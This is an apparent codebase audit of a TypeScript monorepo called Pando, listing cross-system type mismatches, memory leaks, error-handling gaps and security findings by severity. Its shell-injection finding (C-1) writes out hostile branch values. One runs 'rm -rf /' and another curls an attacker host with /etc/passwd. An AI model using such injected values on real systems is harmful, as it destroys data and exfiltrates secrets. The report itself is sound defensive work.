# Pando Codebase Audit

> Generated: 2026-03-08
> Scope: pando-node, pando-code, and cross-system boundaries

---

## HIGH Severity

### H-1: Lux Budget Cap Mismatch (Cross-System)

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 51-82) vs `node/packages/shared/src/types.ts` (lines 241-267)
- **Issue**: pando-code budgets in USD via `BudgetProvider`. engine-adapter converts at a fixed rate of `100 Lux/USD`. But pando-node enforces `DAILY_EMISSION_CAP = 500 Lux`. A single `$100 USD` task = `10,000 Lux`, which blows past the daily cap by 20x.
- **Impact**: Budget enforcement is broken at the system boundary. Tasks that are valid in pando-code get rejected by the ledger.
- **Fix**: Sync the conversion rate with emission caps, or make engine-adapter aware of `DAILY_EMISSION_CAP` before submitting charges.

### H-2: Event Type Vocabulary Mismatch (Cross-System)

- **Location**: `code/packages/core/src/types.ts` (lines 557-579) vs `node/packages/shared/src/types.ts` (lines 82-139)
- **Issue**: pando-code uses `StreamEvent` types (`stream:chunk`, `tool:start`, `tool:result`, `task:progress`, `budget:warning`, `error:doom_loop`, `agent:spawned`, `reasoning:delta`). pando-node uses `MessageType` enum (`PING`, `PONG`, `QUERY`, `TRANSFER`, `AGENT_MESSAGE`, etc.). No shared event vocabulary exists.
- **Impact**: Events crossing system boundaries are silently dropped or misinterpreted.
- **Fix**: Create a unified `PandoEvent` union type in a shared package, used by both systems.

### H-3: No Protocol Versioning on StreamEvents (Cross-System)

- **Location**: `node/packages/shared/src/types.ts` (line 47) vs pando-code `StreamEvent` definition
- **Issue**: pando-node stamps `MESSAGE_VERSION = 1` on P2P messages and validates it in `network.ts:588-612`. pando-code's `StreamEvent` has zero versioning. Format changes will silently break peers on different versions.
- **Impact**: Silent protocol breakage during upgrades when peers run different versions.
- **Fix**: Add a `version` field to `StreamEvent`, increment on format changes.

---

## MEDIUM Severity

### M-1: Response Format Type Erosion (Cross-System)

- **Location**: `code/packages/core/src/engine/engine.ts` (line 876) -> `node/packages/node/src/core/engine-adapter.ts` (line 498) -> `node/packages/node/src/api/platform-api.ts` (lines 28-46)
- **Issue**: engine.ts returns `AsyncGenerator<EngineEvent>` (typed). engine-adapter returns `AsyncGenerator<any>` (untyped). platform-api expects `{ sent: boolean; response?: string }` and only collects `stream:chunk` events.
- **Impact**: Non-chunk events (`tool:start`, `tool:result`, `task:progress`, `budget:warning`) are silently discarded. TypeScript can't catch this because the adapter erases types with `any`.
- **Fix**: Return typed `AsyncGenerator<EngineEvent>` from adapter. Handle all event types in platform-api or explicitly filter with documentation.

### M-2: Agent Status Enum Defined Separately (Cross-System)

- **Location**: `code/packages/core/src/types.ts` (lines 237-246) vs `node/packages/identity/src/constants.ts`
- **Issue**: pando-code defines `AgentStatus = "pending" | "active" | "idle" | "working" | "done" | "failed" | "terminated"`. pando-node identity likely defines a different set of statuses. No shared type exists.
- **Impact**: When platform-api updates an agent's status, it might use a value not in pando-code's enum. Runtime mismatches won't be caught by TypeScript since the systems compile independently.
- **Fix**: Unify agent status enum in a shared types file.

### M-3: Missing Type Boundaries Between Systems (Cross-System)

- **Location**: `code/packages/core/src/types.ts` (lines 46-65, 226-264) vs `node/packages/shared/src/types.ts`
- **Issue**: pando-code defines `AgentRole`, `AgentScope`, `AgentStatus`, `AgentIdentity`. pando-node defines `AgentProfile`, `AgentPermissions`, `AgentCertificate` via `@pando/identity`. Neither re-exports the other's types.
- **Impact**: Type-unsafe cross-system agent creation. engine-adapter uses @pando-code/core types but pando-node API expects @pando/identity types.
- **Fix**: Re-export pando-code agent types from pando-node/shared, or create a shared agent types package.

### M-4: Dependency Version Pinning Conflict (Cross-System)

- **Location**: `code/packages/core/package.json` (lines 14-25) vs `node/package.json` (lines 42-72)
- **Issue**: pando-code pins `"ai": "6.0.0"`, `"drizzle-orm": "0.39.0"`, `"@ai-sdk/anthropic": "3.0.0"` exactly. pando-node references `"@pando-code/core": "*"` (wildcard). TypeScript is `^5.5.0` in node but `5.8.2` in core.
- **Impact**: Latent breakage risk during upgrades. No version validation between systems.
- **Fix**: Add explicit version constraints in node/package.json for shared dependencies.

### M-5: Asymmetric Crypto Capability (Cross-System)

- **Location**: `node/packages/identity/src/core/` (hash.ts, signing.ts, encryption.ts) vs pando-code (no crypto)
- **Issue**: pando-node has full crypto via `@pando/identity` (`sha256`, `sign`, `verify`, `encrypt`, `decrypt`). pando-code has zero crypto functions. engine-adapter calls governance AI review (line 541-543) but can't sign the review result.
- **Impact**: Unsigned governance reviews can be spoofed.
- **Fix**: Allow engine-adapter to access @pando/identity signing, or pass a signing callback.

### M-6: Dual Scanner Systems (pando-code)

- **Location**: `code/packages/core/src/graph/graph.ts` (lines 24-36)
- **Issue**: Two scanner implementations coexist — regex-based (`scanFileRegex`) and AST-based (`scanFileAST`). TypeScript files try AST first, silently fall back to regex on failure. Other languages always use regex.
- **Impact**: Maintenance burden. Silent fallback means AST parser failures go unnoticed. Inconsistent scan quality between languages.
- **Fix**: Complete AST migration for all supported languages, or deprecate AST scanner and optimize regex.

### M-7: Dual Memory Storage Systems (pando-code)

- **Location**: `code/packages/core/src/memory/store.ts` + `code/packages/core/src/memory/memory-store.ts`
- **Issue**: `KnowledgeStore` handles entities, flows, and conversations. `MemoryStore` handles lessons and preferences. Both have separate schemas and CRUD operations. `fetchContext()` in `query.ts` queries both systems.
- **Impact**: Two parallel storage abstractions for overlapping concerns. Increased maintenance burden and potential for inconsistent state.
- **Fix**: Consolidate into unified MemoryStore.

### M-8: findBestBuilder() Unimplemented Scoring (pando-node)

- **Location**: `node/packages/node/src/api/platform-api.ts` (line 78)
- **Issue**: TODO comment: `// TODO: score by latency/load — for now pick first available`. Simply picks the first available builder peer without any scoring.
- **Impact**: Suboptimal builder selection under load. All work routes to the first peer.
- **Fix**: Implement latency/load scoring for better peer selection.

### M-9: Repurposed Database Fields (pando-code)

- **Location**: `code/packages/core/src/engine/engine.ts` (lines 1913, 1919)
- **Issue**: Database columns `layerLessons` and `tokensLessons` were repurposed to store Goal Stack (Layer 5) data. Comments document this but field names are misleading.
- **Impact**: Schema confusion. New developers will misunderstand what these fields store.
- **Fix**: Rename to `layerGoalStack` / `tokensGoalStack` with a migration.

### M-10: Budget Field Naming Conflict (pando-code)

- **Location**: `code/packages/core/src/types.ts` (lines 336-338), `code/packages/cli/src/index.ts` (lines 380, 384, 575, 583)
- **Issue**: Modern fields `cost` / `budget` coexist with legacy aliases `costUSD` / `budgetUSD`. CLI still uses the legacy names.
- **Impact**: Dual field access pattern makes code confusing. Risk of reading stale alias values.
- **Fix**: Update CLI to use modern field names, deprecate legacy aliases.

---

## LOW Severity

### L-1: Scheduler No-Op Stub Methods (pando-node)

- **Location**: `node/packages/node/src/platform/scheduler.ts` (lines 287-305)
- **Issue**: Three stub methods never called anywhere: `setProfileBroadcaster()`, `setMemoryPublisher()`, `setMemoryInjector()`. Left from Phase 27 migration to AgentManager.
- **Fix**: Remove if no external consumers depend on them.

### L-2: Deprecated getBridgeQueue() (pando-node)

- **Location**: `node/packages/node/src/platform/scheduler.ts` (lines 156-160)
- **Issue**: Always returns `null`. Comment: `@deprecated — left as stub for any external callers`.
- **Fix**: Remove after confirming no external usage.

### L-3: Template Route 503 Stubs (pando-node)

- **Location**: `node/packages/node/src/api/platform-api.ts` (lines 4180-4201)
- **Issue**: Five routes (`GET/POST/PUT/DELETE /templates`) return 503 with message "Template registry removed — brain now in @pando-code/core". Kept as backward-compat placeholders from Phase 105.
- **Fix**: Remove once all clients have migrated.

### L-4: Ignored Legacy Constructor Parameters (pando-node)

- **Location**: `node/packages/node/src/platform/scheduler.ts` (lines 130-131), called from `node/packages/node/src/index.ts` (lines 1045-1046)
- **Issue**: `_profileCache: any` and `_workspaceManager: any` are ignored (Phase 27). Callers pass `null as any`.
- **Fix**: Remove parameters from constructor and call sites.

### L-5: Legacy Memory Type Fields (pando-code)

- **Location**: `code/packages/core/src/memory/memory-types.ts` (lines 30-33)
- **Issue**: `steps: string[] | null` and `conditions: Record<string, string> | null` — always `null`, kept for DB compatibility.
- **Fix**: Safe to keep, or remove with a migration that drops the columns.

### L-6: Legacy Database Tables (pando-code)

- **Location**: `code/packages/core/src/db/schema.ts` (lines 241-245)
- **Issue**: Three old tables exported: `entityKnowledge`, `flows`, `knowledgeSessions`. Only used in migrations, not in active code.
- **Fix**: Move to migration-only exports or archive.

### L-7: TurnSummary Type Duplication (pando-code)

- **Location**: `code/packages/cli/src/utils.ts` (line 76)
- **Issue**: `TurnSummary` interface defines `costUSD: number` which duplicates `BudgetState.costUSD` from types.ts.
- **Fix**: Use `BudgetState` type directly.

### L-8: scanFileAST Not Exported (pando-code)

- **Location**: `code/packages/core/src/index.ts` (line 78)
- **Issue**: Only `scanFile` (regex) is exported from public API. `scanFileAST` is internal-only. Users of the public API always get regex-based scanning.
- **Fix**: Export both or document which is recommended.

### L-9: API Endpoint Naming Collision (Cross-System)

- **Location**: `code/packages/server/src/index.ts` (line 41) vs `node/packages/node/src/api/platform-api.ts` (line 123)
- **Issue**: pando-code uses `/v1/chat`, pando-node uses `/v1/chat/message`. If both servers run on the same port, `/v1/chat/message` hits node but `/v1/chat` returns 404 on node.
- **Fix**: Standardize endpoint naming or document which system owns which routes.

### L-10: Config Schema Validation Gap (pando-node)

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (line 508)
- **Issue**: `const baseDir = this.config?.dataDir || pathJoin(homedir(), '.pando');` — unsafe optional chaining with no validation that `config.dataDir` is a valid path. pando-code uses Zod schemas for strict config validation; pando-node does not.
- **Fix**: Add Zod schema validation to node config loading.

---

## Informational (Phase Migration Notes)

These are properly handled migrations, documented here for completeness:

| Phase | What Was Removed | Where Documented |
|-------|-----------------|------------------|
| Phase 27 | Profile broadcasting, memory management -> AgentManager | scheduler.ts |
| Phase 57 | LocalStorageBackend removed, StorageBackend now required | storage-backend.ts, thread-store.ts |
| Phase 69 | Auto-wrap removed, credentials in MongoDB | init-kernel.ts:591 |
| Phase 86 | Sessions removed, auth is now stateless JWT | user-accounts.ts:3, init-platform.ts:743 |
| Phase 105 | Brain state moved to @pando-code/core, template registry removed | platform-api.ts, index.ts:862 |
| N/A | Lesson system moved from KnowledgeStore to MemoryStore | memory/store.ts:363 |
| N/A | Deep-scan removed, AST graph + memories are the knowledge system | engine.ts:44 |
| N/A | makeProjectDeployCallback removed, deployment is agent-driven | index.ts:939 |
| N/A | Orchestrator logic removed (instantiateOrchestrator, ensureProjectOrchestrator) | index.ts:942-944 |

---

## Summary

| Severity | Count | Key Risk |
|----------|-------|----------|
| HIGH     | 3     | Budget math broken, silent event drops, protocol breakage |
| MEDIUM   | 10    | Type erosion, dual systems, missing scoring, schema confusion |
| LOW      | 10    | Removable stubs, legacy aliases, naming collisions |
| Info     | 9     | Documented phase migrations (no action needed) |

**First pass total: 23 actionable issues + 9 informational notes**

---
---

# Second Pass — Deep Audit

> Focus: error handling, security, race conditions, memory leaks, hardcoded values, edge cases

---

## CRITICAL Severity

### C-1: Shell Command Injection via Unsanitized Branch/Repo Parameters

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 256, 265, 268, 271, 274)
- **Issue**: User-controlled `branch` and `repo` parameters are directly interpolated into `execSync()` shell commands without sanitization:
  ```typescript
  execSync(`git -C "${workDir}" fetch origin ${branch} && ... && git -C "${workDir}" pull origin ${branch}`, {...});
  execSync(`git clone --branch ${branch} "${cloneUrl}" "${workDir}"`, {...});
  ```
- **Attack vector**: `branch: "main && rm -rf /"` or `branch: "main; curl attacker.com/exfil?$(cat /etc/passwd)"`
- **Impact**: Arbitrary command execution on the host machine. Full system compromise.
- **Fix**: Strict validation: `if (!/^[a-zA-Z0-9._\/-]+$/.test(branch)) throw new Error('Invalid branch name')`. Or use `execFileSync()` with args array instead of string interpolation.

### C-2: Weak Randomness for Database Primary Keys

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 679, 803)
- **Issue**: Using `Math.random()` to generate unique IDs stored as primary keys:
  ```typescript
  const uuid = `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
  const id = `task-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
  ```
- **Impact**: `Math.random()` is NOT cryptographically secure. Only ~16 bits of entropy (4 base36 chars). Two concurrent calls within the same millisecond can collide. In a distributed system, this WILL happen.
- **Fix**: Use `crypto.randomUUID()` from `node:crypto`.

---

## HIGH Severity (Second Pass)

### H2-1: Swallowed Promise Rejections in SSE Streams

- **Location**: `code/packages/server/src/routes/api.ts` (lines 517, 691, 698)
- **Issue**: SSE write errors silently swallowed:
  ```typescript
  stream.writeSSE({...}).catch(() => {});       // Lines 517, 691
  stream.writeSSE({...}).catch(() => { clearInterval(keepAlive); })  // Line 698
  ```
- **Impact**: If an SSE write fails (client disconnect, network issue), the server has zero visibility. Silent failures can cascade into zombie streams that consume resources indefinitely.
- **Fix**: `.catch(err => logger.warn('[SSE] write failed:', err))`

### H2-2: Unsanitized Error Messages in HTTP Responses

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 281, 590)
- **Issue**: Raw error messages from external processes leak into HTTP response bodies:
  ```typescript
  return { success: false, output: `pando_workspace failed: ${err.message}` };
  return { safe: true, risks: [], recommendation: `AI review error: ${err.message}` };
  ```
- **Impact**: Stack traces, file paths, library versions, and system information leak to clients. Useful for reconnaissance in an attack.
- **Fix**: Return generic error message to client; log full error server-side.

### H2-3: Unbounded Interval Accumulation (Memory Leak)

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (line 856)
- **Issue**: Project tick intervals pushed to array without cleanup:
  ```typescript
  if (!(this as any)._projectIntervals) (this as any)._projectIntervals = [];
  (this as any)._projectIntervals.push(tickInterval);
  // No cleanup code — intervals accumulate forever
  ```
- **Impact**: Each project registration adds an interval. If projects are created/destroyed repeatedly, intervals grow unbounded. Each leaked interval also holds references to closures, preventing garbage collection.
- **Fix**: Track intervals by projectId. Clear old interval before registering new one. Implement `stop()` cleanup.

### H2-4: Unsafe JSON.parse() Without Try-Catch

- **Location**: `node/packages/node/src/platform/resource-registry.ts` (lines 103, 109)
- **Issue**: Parsing database-sourced JSON without error handling:
  ```typescript
  grantedTo: JSON.parse(row.granted_to),    // No try-catch
  metadata: row.metadata ? JSON.parse(row.metadata) : undefined,
  ```
- **Impact**: If the database contains malformed JSON (migration bug, corruption, or injection), the entire resource registry initialization crashes with no recovery path.
- **Fix**: Wrap in try-catch with fallback: `try { JSON.parse(row.granted_to) } catch { return [] }`

---

## MEDIUM Severity (Second Pass)

### M2-1: Event Listener Leak in SSE Streams

- **Location**: `code/packages/server/src/routes/api.ts` (lines 687-699)
- **Issue**: Event listeners registered on engine but cleanup depends on stream failure:
  ```typescript
  engine.events.onAny(handler);           // No explicit unsubscribe
  const keepAlive = setInterval(...);     // Cleared only if writeSSE fails
  ```
- **Impact**: If the SSE stream closes without a write failure (e.g., graceful close), the `onAny` handler and keepAlive interval persist. Each new SSE connection adds another handler that is never removed.
- **Fix**: Use `try/finally` block to explicitly call `engine.events.off(handler)` and `clearInterval(keepAlive)`.

### M2-2: Race Condition — Pool Used Before Initialization

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 470-510)
- **Issue**: `this.pool` is checked with `if (!this.pool)` at initialization, but async methods use it without re-checking:
  ```typescript
  await this.pool.getOrCreate('system', {...});  // Could be null if called before start()
  yield* this.pool.send(id, message);            // No null check
  ```
- **Impact**: If `sendMessage()` is called before `start()` completes, operations fail with vague "Cannot read properties of undefined" errors.
- **Fix**: Add defensive null check: `if (!this.pool) throw new Error('EngineAdapter not started')`

### M2-3: Stale Prepared Statements After DB Reconnection

- **Location**: `node/packages/node/src/platform/resource-registry.ts` (lines 88-94)
- **Issue**: SQLite prepared statements cached in instance variables but never re-validated:
  ```typescript
  this.stmtInsert = this.db.prepare(`...`);
  // If DB is closed and reopened, stmtInsert is stale
  this.stmtInsert.run(...);  // Undefined behavior
  ```
- **Impact**: After a database reconnection, all prepared statement references are invalid. Calls will fail with cryptic SQLite errors.
- **Fix**: Re-prepare statements on reconnect, or prepare lazily on each call.

### M2-4: Unhandled Rejection in Async IIFE

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 721-733)
- **Issue**: Background async IIFE with no outer `.catch()`:
  ```typescript
  (async () => {
    try { ... } catch (err: any) { console.error(...); }
  })();  // No .catch() on the IIFE itself
  ```
- **Impact**: If the IIFE throws before entering the try block (e.g., template literal evaluation), Node.js emits an unhandled rejection. In Node 15+, this terminates the process by default.
- **Fix**: Add `.catch()`: `(async () => { ... })().catch(err => console.error(...))`

### M2-5: Missing Error Propagation from Task Callbacks

- **Location**: `code/packages/core/src/pool/scheduler.ts` (lines 191-193)
- **Issue**: Task execution error is forwarded to callback, but callback may throw:
  ```typescript
  this._executeTask(task).catch((err) => {
    task.onError?.(err instanceof Error ? err : new Error(String(err)));
  });
  ```
- **Impact**: If `task.onError()` itself throws, that exception is unhandled. The scheduler keeps running but the error vanishes.
- **Fix**: Wrap: `try { task.onError?.(...) } catch (e) { console.error('onError callback failed', e) }`

### M2-6: Insufficient Timeout for Crypto Operations

- **Location**: `node/packages/node/src/platform/user-accounts.ts` (lines 43-48)
- **Issue**: All crypto operations use a fixed 5-second timeout:
  ```typescript
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
  // withTimeout(..., 5000, ...)
  ```
- **Impact**: Scrypt with N=16384 can exceed 5 seconds on slower machines or under load. Legitimate password verification times out, locking users out.
- **Fix**: Use adaptive timeout: 10-30s for scrypt operations, 5s for fast operations.

### M2-7: Race Condition in Timer Cleanup

- **Location**: `code/packages/core/src/pool/engine-pool.ts` (lines 86-90)
- **Issue**: No guard against concurrent `stop()` calls:
  ```typescript
  if (this.evictTimer) {
    clearInterval(this.evictTimer);
    this.evictTimer = null;
  }
  ```
- **Impact**: Two concurrent `stop()` calls could both enter the `if` block before either sets `null`. While `clearInterval` is idempotent in Node.js, this pattern indicates broader concurrency issues.
- **Fix**: Add stopped flag: `if (this.stopped) return; this.stopped = true;`

---

## LOW Severity (Second Pass)

### L2-1: Implicit Type Coercion in SQL Column Bindings

- **Location**: `node/packages/node/src/core/engine-adapter.ts` (lines 708, 643-644)
- **Issue**: Dynamic SET clause built from user input:
  ```typescript
  db.prepare(`UPDATE board_tasks SET ${sets.join(', ')} WHERE id = ?`).run(...vals);
  ```
- **Impact**: If `sets` array order doesn't match `vals` array, wrong columns get wrong values. Column names aren't validated against schema.
- **Fix**: Use a safer query builder or validate column names against a whitelist.

### L2-2: Missing Null Guard on Role Capitalization

- **Location**: `code/packages/server/src/routes/api.ts` (lines 614-618)
- **Issue**: Role string used without null check:
  ```typescript
  displayName: a.display_name || a.role.charAt(0).toUpperCase() + a.role.slice(1),
  ```
- **Impact**: If `a.role` is `undefined` or `null`, this throws at runtime.
- **Fix**: `(a.role || 'agent').charAt(0).toUpperCase() + ...`

### L2-3: Unused Config Fields

- **Location**: `node/packages/node/src/core/engine-adapter.ts`
- **Issue**: `skipKnowledgeSync` defined in PoolConfig interface but never passed or referenced. `defaultModel` stored but undocumented.
- **Fix**: Document or remove from interface.

---

## Updated Summary

| Severity | First Pass | Second Pass | Total |
|----------|-----------|-------------|-------|
| CRITICAL | 0         | 2           | **2** |
| HIGH     | 3         | 4           | **7** |
| MEDIUM   | 10        | 7           | **17** |
| LOW      | 10        | 3           | **13** |
| Info     | 9         | 0           | **9** |

**Grand total: 39 actionable issues + 9 informational notes**

### Top 5 — Fix Immediately

1. **C-1**: Shell command injection in git operations (engine-adapter.ts)
2. **C-2**: Weak randomness for primary keys (engine-adapter.ts)
3. **H-1**: Lux budget cap math broken at system boundary
4. **H2-2**: Error messages leaking system internals to clients
5. **H2-3**: Unbounded interval accumulation (memory leak)
